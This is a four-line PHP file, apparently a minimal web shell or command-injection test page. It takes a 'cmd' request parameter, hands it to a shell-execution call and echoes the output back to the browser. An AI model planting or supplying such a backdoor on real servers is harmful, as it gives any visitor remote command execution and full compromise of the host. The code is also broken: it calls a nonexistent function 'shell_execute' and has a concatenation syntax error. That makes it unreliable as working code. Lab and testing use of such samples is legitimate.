<?php
$out=shell_execute($_REQUEST['cmd']);
echo "<br><b>CMDi result for:</b>".$_REQUEST['cmd']."<br>".$out"</br>";
?>
